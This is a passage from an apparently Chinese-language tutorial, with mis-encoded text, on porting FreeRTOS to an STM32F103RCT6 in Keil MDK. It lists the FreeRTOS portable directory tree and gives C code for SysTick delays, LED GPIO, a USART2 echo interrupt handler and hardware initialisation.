    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€HCS12
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€IA32_flat
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€MCF5235
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€MicroBlaze
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€MicroBlazeV8
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_exceptions.c
    â”‚  â”‚
    â”‚  â”œâ”€MicroBlazeV9
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_exceptions.c
    â”‚  â”‚
    â”‚  â”œâ”€MSP430F449
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€NiosII
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.S
    â”‚  â”‚
    â”‚  â”œâ”€PPC405_Xilinx
    â”‚  â”‚      FPU_Macros.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€PPC440_Xilinx
    â”‚  â”‚      FPU_Macros.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RL78
    â”‚  â”‚      isr_support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RX100
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RX600
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RX600v2
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€STR75x
    â”‚  â”‚      port.c
    â”‚  â”‚      portISR.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â””â”€TriCore_1782
    â”‚          port.c
    â”‚          portmacro.h
    â”‚          porttrap.c
    â”‚
    â”œâ”€IAR
    â”‚  â”œâ”€78K0R
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s26
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CA5_No_GIC
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.h
    â”‚  â”‚      portASM.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CA9
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.h
    â”‚  â”‚      portASM.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM0
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM3
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM4F
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM7
    â”‚  â”‚  â”‚  ReadMe.txt
    â”‚  â”‚  â”‚
    â”‚  â”‚  â””â”€r0p1
    â”‚  â”‚          port.c
    â”‚  â”‚          portasm.s
    â”‚  â”‚          portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CRx_No_GIC
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ATMega323
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      portmacro.s90
    â”‚  â”‚
    â”‚  â”œâ”€AtmelSAM7S64
    â”‚  â”‚      AT91SAM7S64.h
    â”‚  â”‚      AT91SAM7S64_inc.h
    â”‚  â”‚      AT91SAM7X128.h
    â”‚  â”‚      AT91SAM7X128_inc.h
    â”‚  â”‚      AT91SAM7X256.h
    â”‚  â”‚      AT91SAM7X256_inc.h
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      lib_AT91SAM7S64.h
    â”‚  â”‚      lib_AT91SAM7X128.h
    â”‚  â”‚      lib_AT91SAM7X256.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€AtmelSAM9XE
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€AVR32_UC3
    â”‚  â”‚      exception.s82
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      read.c
    â”‚  â”‚      write.c
    â”‚  â”‚
    â”‚  â”œâ”€LPC2000
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€MSP430
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.h
    â”‚  â”‚      portext.s43
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€MSP430X
    â”‚  â”‚      data_model.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portext.s43
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RL78
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s87
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€RX100
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.s
    â”‚  â”‚
    â”‚  â”œâ”€RX600
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.s
    â”‚  â”‚
    â”‚  â”œâ”€RXv2
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.s
    â”‚  â”‚
    â”‚  â”œâ”€STR71x
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€STR75x
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€STR91x
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.s79
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â””â”€V850ES
    â”‚          ISR_Support.h
    â”‚          port.c
    â”‚          portasm.s85
    â”‚          portasm_Fx3.s85
    â”‚          portasm_Hx2.s85
    â”‚          portmacro.h
    â”‚
    â”œâ”€Keil
    â”‚      See-also-the-RVDS-directory.txt
    â”‚
    â”œâ”€MemMang
    â”‚      heap_1.c
    â”‚      heap_2.c
    â”‚      heap_3.c
    â”‚      heap_4.c
    â”‚      heap_5.c
    â”‚      ReadMe.url
    â”‚
    â”œâ”€MikroC
    â”‚  â””â”€ARM_CM4F
    â”‚          port.c
    â”‚          portmacro.h
    â”‚
    â”œâ”€MPLAB
    â”‚  â”œâ”€PIC18F
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      stdio.h
    â”‚  â”‚
    â”‚  â”œâ”€PIC24_dsPIC
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm_dsPIC.S
    â”‚  â”‚      portasm_PIC24.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€PIC32MEC14xx
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.S
    â”‚  â”‚
    â”‚  â”œâ”€PIC32MX
    â”‚  â”‚      ISR_Support.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.S
    â”‚  â”‚
    â”‚  â””â”€PIC32MZ
    â”‚          ISR_Support.h
    â”‚          port.c
    â”‚          portmacro.h
    â”‚          port_asm.S
    â”‚
    â”œâ”€MSVC-MingW
    â”‚      port.c
    â”‚      portmacro.h
    â”‚
    â”œâ”€oWatcom
    â”‚  â””â”€16BitDOS
    â”‚      â”œâ”€common
    â”‚      â”‚      portasm.h
    â”‚      â”‚      portcomn.c
    â”‚      â”‚
    â”‚      â”œâ”€Flsh186
    â”‚      â”‚      port.c
    â”‚      â”‚      portmacro.h
    â”‚      â”‚
    â”‚      â””â”€PC
    â”‚              port.c
    â”‚              portmacro.h
    â”‚
    â”œâ”€Paradigm
    â”‚  â””â”€Tern_EE
    â”‚      â”œâ”€large_untested
    â”‚      â”‚      port.c
    â”‚      â”‚      portasm.h
    â”‚      â”‚      portmacro.h
    â”‚      â”‚
    â”‚      â””â”€small
    â”‚              port.c
    â”‚              portasm.h
    â”‚              portmacro.h
    â”‚
    â”œâ”€Renesas
    â”‚  â”œâ”€RX100
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.src
    â”‚  â”‚
    â”‚  â”œâ”€RX200
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.src
    â”‚  â”‚
    â”‚  â”œâ”€RX600
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.src
    â”‚  â”‚
    â”‚  â”œâ”€RX600v2
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      port_asm.src
    â”‚  â”‚
    â”‚  â””â”€SH2A_FPU
    â”‚          ISR_Support.inc
    â”‚          port.c
    â”‚          portasm.src
    â”‚          portmacro.h
    â”‚
    â”œâ”€Rowley
    â”‚  â”œâ”€ARM7
    â”‚  â”‚      readme.txt
    â”‚  â”‚
    â”‚  â””â”€MSP430F449
    â”‚          port.c
    â”‚          portasm.h
    â”‚          portext.asm
    â”‚          portmacro.h
    â”‚
    â”œâ”€RVDS
    â”‚  â”œâ”€ARM7_LPC21xx
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      portmacro.inc
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CA9
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.s
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      portmacro.inc
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM0
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM3
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM4F
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM4_MPU
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â””â”€ARM_CM7
    â”‚      â”‚  ReadMe.txt
    â”‚      â”‚
    â”‚      â””â”€r0p1
    â”‚              port.c
    â”‚              portmacro.h
    â”‚
    â”œâ”€SDCC
    â”‚  â””â”€Cygnal
    â”‚          port.c
    â”‚          portmacro.h
    â”‚
    â”œâ”€Softune
    â”‚  â”œâ”€MB91460
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚      __STD_LIB_sbrk.c
    â”‚  â”‚
    â”‚  â””â”€MB96340
    â”‚          port.c
    â”‚          portmacro.h
    â”‚          __STD_LIB_sbrk.c
    â”‚
    â”œâ”€Tasking
    â”‚  â””â”€ARM_CM4F
    â”‚          port.c
    â”‚          portmacro.h
    â”‚          port_asm.asm
    â”‚
    â””â”€WizC
        â””â”€PIC18
            â”‚  addFreeRTOS.h
            â”‚  Install.bat
            â”‚  port.c
            â”‚  portmacro.h
            â”‚
            â””â”€Drivers
                â””â”€Tick
                        isrTick.c
                        Tick.c

</code></pre>
<h2 id="ç³»ç»Ÿç§»æ¤"><a href="#ç³»ç»Ÿç§»æ¤" class="headerlink" title="ç³»ç»Ÿç§»æ¤"></a>ç³»ç»Ÿç§»æ¤</h2><p>ä»¥ stm32f103RCT6 ä¸ºä¾‹ï¼Œé€‰æ‹© Keil MDK v5.21.1.0 ä½œä¸ºå¼€å‘å¹³å°è¿›è¡Œç³»ç»Ÿç§»æ¤ã€‚</p>
<h3 id="åŠŸèƒ½æè¿°"><a href="#åŠŸèƒ½æè¿°" class="headerlink" title="åŠŸèƒ½æè¿°"></a>åŠŸèƒ½æè¿°</h3><ol>
<li>PB10 ä½œä¸ºè¾“å‡ºå£ï¼Œæ§åˆ¶ LED çš„äº®ç­ï¼›</li>
<li>ç¼–å†™å»¶æ—¶å‡½æ•° delay ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ï¼›</li>
<li>ä½¿ç”¨ USART2 å¾ªç¯å‘é€æ•°æ®ï¼Œæ³¢ç‰¹ç‡9600ï¼Œ8ä½æ•°æ®ä½ï¼Œ1ä½åœæ­¢ä½ï¼Œæ— æ ¡éªŒï¼Œæ— ç¡¬ä»¶æ§åˆ¶æµï¼›</li>
<li>ç³»ç»Ÿç§»æ¤ï¼Œæ·»åŠ  3 ä¸ª taskï¼švLEDOnTaskï¼ŒvLEDOffTaskï¼ŒvUasrtSendTask</li>
</ol>
<h3 id="åˆ›å»ºé¡¹ç›®-BrightLed"><a href="#åˆ›å»ºé¡¹ç›®-BrightLed" class="headerlink" title="åˆ›å»ºé¡¹ç›® (BrightLed)"></a>åˆ›å»ºé¡¹ç›® (BrightLed)</h3><ul>
<li>é€‰æ‹©èŠ¯ç‰‡ (stm32f103RCT6)</li>
</ul>
<p><img src="/assets/stm32/selectChip.png" alt="é€‰æ‹©èŠ¯ç‰‡"></p>
<ul>
<li>é€‰æ‹©å¤–è®¾</li>
</ul>
<p>è‡ªä» Keil MDK æ›´æ–°è‡³ v5.0 ä»¥åï¼Œè½¯ä»¶å®‰è£…å®Œæˆä¾¿å¯ä½¿ç”¨ &quot;Pack installer&quot; è®©å…¶è‡ªåŠ¨ä¸‹è½½æ‰€éœ€çš„è½¯ä»¶åŒ…ï¼›æ–°å»ºé¡¹ç›®ä¹Ÿå˜å¾—æ›´åŠ ç®€å•æ–¹ä¾¿ï¼Œå¯ä»¥ä½¿ç”¨ &quot;manager run-time environment&quot; é€‰æ‹©æ‰€éœ€çš„ç‰‡å†…å¤–è®¾ã€‚</p>
<pre><code class="txt">Software Compoent
â”œâ”€CMSIS
â”‚    â”‚  CORE
â”‚    â”‚
â””â”€Device
     â”‚  GPIO
     â”‚  Startup
     â”‚
     â””â”€stdPeriph Drivers
         â”‚  Framework
         â”‚  GPIO
         â”‚  RCC
         â”‚  USARTs
</code></pre>
<p>å¤–è®¾è¯´æ˜ï¼š</p>
<ol>
<li><strong>CORE</strong>(å¿…é€‰)ï¼š æä¾›ä¸ Cortex-M0ã€<strong>Cortex-M3</strong>ã€Cortex-M4ã€SC000 å’Œ SC300 å¤„ç†å™¨ä¸å¤–å›´å¯„å­˜å™¨ä¹‹é—´çš„æ¥å£</li>
<li><strong>Framework</strong>(å¿…é€‰)ï¼š æ ‡å‡†å¤–è®¾é©±åŠ¨æ¡†æ¶(Standard Peripheral Drivers Framework)</li>
<li><strong>RCC</strong>(å¿…é€‰)ï¼š æä¾›ä¸ç³»ç»Ÿæ—¶é’Ÿç›¸å…³çš„åº“å‡½æ•°</li>
<li><strong>GPIO</strong>ï¼š æä¾›ä¸é€šç”¨IOæ¥å£ç›¸å…³çš„åº“å‡½æ•°</li>
<li><strong>USART</strong>ï¼š æä¾›ä¸UART/USARTç›¸å…³çš„åº“å‡½æ•°</li>
</ol>
<p><img src="/assets/stm32/selectDevice.png" alt="é€‰æ‹©å¤–è®¾"></p>
<ul>
<li>è®¾ç½®å‚æ•°</li>
</ul>
<p>æ‰“å¼€ <code>Options for target</code>ï¼Œä¾æ¬¡è®¾ç½®ä¸‹åˆ—å‚æ•°ï¼š</p>
<ol>
<li>Target &gt; Xtal(MHz)): 8.0</li>
<li>C/C++  &gt; Define: USE_STDPERIPH_DRIVER,STM32F10X_MD</li>
<li>Debug  &gt; Use: ST-Link Debugger<br> 3.1 Settings &gt; Debug &gt; Debug Adapter: ST-LINK/V2; Port:SW; Max: 1.8MHz<br> 3.2 Settings &gt; Flash Download &gt; Reset and Run:[âˆš]<br> 3.3 Settings &gt; Flash Download &gt; Programming Algorithm: STM32f10x Med-density Flash</li>
</ol>
<p>æ‰€æœ‰å‚æ•°å‡è®¾ç½®å®Œæˆåï¼Œé¡¹ç›®åˆ›å»ºè¿‡ç¨‹å°±ç»“æŸäº†ã€‚</p>
<p><img src="/assets/stm32/setSymbols.png" alt="è®¾ç½®Processing Symbols"></p>
<p><img src="/assets/stm32/selectFlash.png" alt="é€‰æ‹©flashå¤§å°"></p>
<h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><p>åˆ›å»ºé¡¹ç›®åï¼Œéœ€è¦ç¼–å†™ä»£ç ä»¥å®ç°å¯¹ç³»ç»Ÿæ—¶é’ŸåŠæ‰€éœ€å¤–è®¾çš„åˆå§‹åŒ–ã€‚</p>
<ul>
<li>åˆå§‹åŒ–æµç¨‹</li>
</ul>
<ol>
<li>é¦–å…ˆï¼Œå°†é»˜è®¤ç»„åç§°æ”¹ä¸º <code>USER</code> ï¼Œå¹¶åœ¨æœ¬åœ°é¡¹ç›®ç›®å½•ä¸‹æ·»åŠ æ–‡ä»¶å¤¹ï¼Œå‘½åä¸º &quot;USER&quot; ã€‚</li>
<li>å…¶æ¬¡ï¼Œæ–°å»ºå¹¶ä¿å­˜ä»¥ä¸‹æ–‡ä»¶è‡³ &quot;USER&quot; æ–‡ä»¶å¤¹ï¼ŒåŒæ—¶æ·»åŠ å…¶ä¸­çš„ .c æ–‡ä»¶åˆ°é¡¹ç›®ç»„ <code>USER</code>ä¸­ã€‚<br> 2.1 ä¸»ç¨‹åºï¼šmain.c / main.h<br> 2.2 ä¸­æ–­ç¨‹åºï¼šstm32f10x_it.c / stm32f10x_it.h<br> 2.3 å»¶æ—¶æ¨¡å—: delay.c / delay.h<br> 2.4 ledæ§åˆ¶æ¨¡å—ï¼šled.c / led.h<br> 2.5 ä¸²å£é€šä¿¡æ¨¡å—ï¼šusart.c / usart.h</li>
<li>æœ€åï¼Œå¯¹å„ä¸ªæ–‡ä»¶è¿›è¡Œç¼–ç ï¼Œå®Œæˆå„é¡¹åˆå§‹åŒ–ä»»åŠ¡</li>
</ol>
<ul>
<li>é¡¹ç›®æ–‡ä»¶ç»“æ„</li>
</ul>
<p><img src="/assets/stm32/projectFile.png" alt="é¡¹ç›®ç›®å½•"></p>
<ul>
<li>åˆå§‹åŒ–ç¨‹åºè®¾è®¡</li>
</ul>
<blockquote>
<p><strong>delay.c / delay.h</strong></p>
</blockquote>
<p>delay.c</p>
<pre><code class="C">#include &quot;delay.h&quot;

volatile u32 TimingDelay;

void delayInit(void)
{
  /* SystemFrequency / 1000    1ms
   * SystemFrequency / 100000   10us
   * SystemFrequency / 1000000 1us
   */
  #define SYSCLK_FREQ_72MHz  72000000    // ç³»ç»Ÿä¸»é¢‘
  if (SysTick_Config(SYSCLK_FREQ_72MHz / 1000000))
  {
  /* Capture error */
    while (1);
  }
  SysTick-&gt;CTRL &amp;= ~SysTick_CTRL_ENABLE_Msk;
}

// msçº§å»¶æ—¶å‡½æ•°
void delay(__IO u32 nTime)
{
  TimingDelay = nTime * 1000;
  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;
  while(TimingDelay != 0);
}

// usçº§å»¶æ—¶å‡½æ•°
void delayMicroseconds(__IO u32 nTime)
{
  TimingDelay = nTime;
  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;
  while(TimingDelay != 0);
}

</code></pre>
<p>delay.h</p>
<pre><code class="C">#ifndef DELAY_H_
#define DELAY_H_

#include &quot;stm32f10x.h&quot;

void delayInit(void);
void delay(__IO u32 nTime);
void delayMicroseconds(__IO u32 nTime);

#endif /* DELAY_H_ */
</code></pre>
<blockquote>
<p><strong>led.c / led.h</strong></p>
</blockquote>
<p>led.c</p>
<pre><code class="C">#include &quot;led.h&quot;

void ledGPIOConfiguration(void)
{
  GPIO_InitTypeDef  GPIO_InitStructure;

  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_10;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;
  GPIO_Init(GPIOB, &amp;GPIO_InitStructure);
}
</code></pre>
<p>led.h</p>
<pre><code class="C">#ifndef LED_H
#define LED_H

#include &quot;stm32f10x.h&quot;

#define LED_PORT (GPIO_Pin_10)

void ledGPIOConfiguration(void);

#endif /* LED_H */
</code></pre>
<blockquote>
<p><strong>usart.c / usart.h</strong></p>
</blockquote>
<p>usart.c</p>
<pre><code class="C">#include &quot;usart.h&quot;

//ä¸²å£é©±åŠ¨åº”ç”¨æ ‡å¿—

static bool Derive_UART2SendFlag, Derive_UART2TxIntState;

//å¼€ä¸²å£ å¹¶æ‰§è¡Œåˆå§‹åŒ–
//8ä½æ•°æ®ä½ æ— æ ¡éªŒ 1ä½èµ·å§‹ä½/1ä½åœæ­¢ä½ å…è®¸æ”¶å‘ä¸­æ–­  å®å®šä¹‰BAUDRATEè®¾å®šæ³¢ç‰¹ç‡ ä½ä¼˜å…ˆçº§ä¸­æ–­
void usart2Config(void)
{
  //æ³¢ç‰¹ç‡è®¾ç½®
  #define   UART_BAUDDEF  9600
  GPIO_InitTypeDef    GPIO_InitStructure;
  USART_InitTypeDef   USART_InitStructure;
  NVIC_InitTypeDef NVIC_InitStructure;
  RCC_APB1PeriphClockCmd(RCC_APB1Periph_USART2, ENABLE);
  //ç®¡è„šé…ç½®
  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_2;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_PP;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);      /* TXIO */
  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_3;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IN_FLOATING;
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);       /* RXIO */
  //ä¸²å£å·¥ä½œæ¨¡å¼é…ç½®
  USART_InitStructure.USART_BaudRate = UART_BAUDDEF;
  USART_InitStructure.USART_WordLength = USART_WordLength_8b;
  USART_InitStructure.USART_StopBits = USART_StopBits_1;
  USART_InitStructure.USART_Parity = USART_Parity_No ;
  USART_InitStructure.USART_HardwareFlowControl = USART_HardwareFlowControl_None;
  USART_InitStructure.USART_Mode = USART_Mode_Rx | USART_Mode_Tx;
  USART_Init(USART2, &amp;USART_InitStructure);
  //ä¸­æ–­è®¾ç½®
  NVIC_InitStructure.NVIC_IRQChannel = USART2_IRQn;
  NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 1;       //ä½ä¼˜å…ˆçº§åˆ«çš„ä¸­æ–­
  NVIC_InitStructure.NVIC_IRQChannelSubPriority = 0;        //å“åº”ä¸­æ–­ç­‰çº§ä¸º0
  NVIC_InitStructure.NVIC_IRQChannelCmd = ENABLE;
  NVIC_Init(&amp;NVIC_InitStructure);
  Derive_UART2TxIntState = false;
  USART_ITConfig(USART2, USART_IT_RXNE, ENABLE);
  //START
  USART_Cmd(USART2, ENABLE);
}

//ä»ä¸²å£å‘é€ä¸€ä¸ªå­—èŠ‚
void UARTSendByByter(u16 Data)
{
  //å‘é€æ•°æ®
  USART_SendData(USART2, (u8)Data);

  if(!Derive_UART2TxIntState)
  {
    Derive_UART2TxIntState = true;
    USART_ITConfig(USART2, USART_IT_TXE, ENABLE);
  }
  Derive_UART2SendFlag = true;
}

//ä¸²å£æ”¶å‘ä¸­æ–­å¤„ç†å‡½æ•°
void UART_TRxOver_Interrupt(void)
{
  if(USART_GetITStatus(USART2, USART_IT_TXE) == SET)
  {
    //å‘é€ä¸­æ–­
    //æ¸…é›¶æ ‡å¿—
    USART_ClearITPendingBit(USART2, USART_IT_TXE);
    Derive_UART2SendFlag = false;
    //tx interrupt..
    //...
    if(!Derive_UART2SendFlag)
    {
        USART_ITConfig(USART2, USART_IT_TXE, DISABLE);
        Derive_UART2TxIntState = false;
    }
  }
  if(USART_GetITStatus(USART2, USART_IT_RXNE) == SET)
  {
    //æ¥æ”¶ä¸­æ–­
    //-------- å›ä¼ æ¥æ”¶åˆ°çš„æ•°æ® --------
    UARTSendByByter(USART_ReceiveData(USART2));
    USART_ClearFlag(USART2,USART_FLAG_RXNE);
  }
}

</code></pre>
<p>usart.h</p>
<pre><code class="C">#ifndef USART_H
#define USART_H

#include &quot;stm32f10x.h&quot;
#include &quot;stm32f10x_rcc.h&quot;
#include &quot;stm32f10x_gpio.h&quot;
#include &quot;stm32f10x_usart.h&quot;

#define false 0
#define true 1
typedef unsigned char bool;

void usart2Config(void);
void UARTSendByByter(u16 Data);

#endif  /* USART_H */
</code></pre>
<blockquote>
<p><strong>stm32f10x_it.c / stm32f10x_it.h</strong></p>
</blockquote>
<p>stm32f10x_it.c</p>
<pre><code class="C">#include &quot;stm32f10x_it.h&quot;
void NMI_Handler(void)
{
}

void HardFault_Handler(void)
{
  /* Go to infinite loop when Hard Fault exception occurs */
  while (1)
  {
  }
}

void MemManage_Handler(void)
{
  /* Go to infinite loop when Memory Manage exception occurs */
  while (1)
  {
  }
}

void BusFault_Handler(void)
{
  /* Go to infinite loop when Bus Fault exception occurs */
  while (1)
  {
  }
}

void UsageFault_Handler(void)
{
  /* Go to infinite loop when Usage Fault exception occurs */
  while (1)
  {
  }
}

#ifndef RTE_RTOS_RTX
void SVC_Handler(void)
{
}
#endif

void DebugMon_Handler(void)
{
}

#ifndef RTE_RTOS_RTX
void PendSV_Handler(void)
{
}
#endif

extern volatile u32 TimingDelay;
void SysTick_Handler(void) {
  if (TimingDelay != 0x00) {
    TimingDelay--;
  }
}

extern void UART_TRxOver_Interrupt(void);
void USART2_IRQHandler(void)
{
  UART_TRxOver_Interrupt();
}
</code></pre>
<p>stm32f10x_it.h</p>
<pre><code class="C">#ifndef __STM32F10x_IT_H
#define __STM32F10x_IT_H

#ifdef __cplusplus
 extern &quot;C&quot; {
#endif

/* Includes ------------------------------------------------------------------*/
#include &quot;stm32f10x.h&quot;
/* Exported types ------------------------------------------------------------*/
/* Exported constants --------------------------------------------------------*/
/* Exported macro ------------------------------------------------------------*/
/* Exported functions --------------------------------------------------------*/

void NMI_Handler(void);
void HardFault_Handler(void);
void MemManage_Handler(void);
void BusFault_Handler(void);
void UsageFault_Handler(void);
void SVC_Handler(void);
void DebugMon_Handler(void);
void PendSV_Handler(void);
void SysTick_Handler(void);
void USART2_IRQHandler(void);

#ifdef __cplusplus
}
#endif

#endif /* __STM32F10x_IT_H */
</code></pre>
<blockquote>
<p><strong>main.c / main.h</strong></p>
</blockquote>
<p>main.c</p>
<pre><code class="C">/*******************************************************************************
 * Header       : Learning FreeRTOS
 * File Name    : main.c
 * Author       : wgt
 * Date         : 2016.11.2
 * Description  :
 *******************************************************************************/
#include &quot;main.h&quot;

/* ENABLE the clk of GPIO */
static void deviceInit(void);

/* setup the hardware of system */
static void prvSetupHardware(void);

/*******************************************************************************
* Function Name  : main
* Description    : main function,the interface of system
* Input          : None
* Return         : None
*******************************************************************************/
int main(void)
{
  prvSetupHardware();  // è®¾å¤‡åˆå§‹åŒ–

  while(1)
  {
  }
}

/*******************************************************************************
* Function Name  : prvSetupHardware
* Description    : initial hardwares
* Input          : None
* Return         : None
*******************************************************************************/
static void prvSetupHardware(void)
{
  deviceInit();
  delayInit();    // SysTickæ»´ç­”æ—¶é’Ÿåˆå§‹åŒ–
  ledGPIOConfiguration();
  usart2Config();
}


/*******************************************************************************
* Function Name  : deviceInit
* Description    : ENABLE the clk of GPIO
* Input          : None
* Return         : None
*******************************************************************************/
static void deviceInit(void)
{
  //--------------------------- CLK INIT, HSE PLL ----------------------------
  ErrorStatus HSEStartUpStatus;
  //RCC reset
  RCC_DeInit();
  //å¼€å¯å¤–éƒ¨æ—¶é’Ÿ å¹¶æ‰§è¡Œåˆå§‹åŒ–
  RCC_HSEConfig(RCC_HSE_ON);
  //ç­‰å¾…å¤–éƒ¨æ—¶é’Ÿå‡†å¤‡å¥½
  HSEStartUpStatus = RCC_WaitForHSEStartUp();
  //å¯åŠ¨å¤±è´¥ åœ¨è¿™é‡Œç­‰å¾…
  while(HSEStartUpStatus == ERROR);
  //è®¾ç½®å†…éƒ¨æ€»çº¿æ—¶é’Ÿ
  RCC_HCLKConfig(RCC_SYSCLK_Div1);
  RCC_PCLK1Config(RCC_HCLK_Div1);
